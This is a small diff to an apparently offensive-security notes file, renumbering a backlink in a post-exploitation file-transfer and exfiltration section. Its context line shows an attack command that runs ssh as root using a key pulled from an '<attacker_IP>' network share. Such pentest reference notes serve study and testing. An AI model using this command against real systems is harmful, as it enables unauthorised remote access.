@@ -83,7 +83,7 @@ C:\> ssh -i \\<attacker_IP>\key.pem root@<IP>
 
 ### Backlinks
 
-- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Cross Platform/Network Ports/SSH/Usage|File Transfer: SCP]]
+- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Cross Platform/Network Ports/SSH/Usage|File Transfer: SCP]]
 
 ### LOLBAS
 
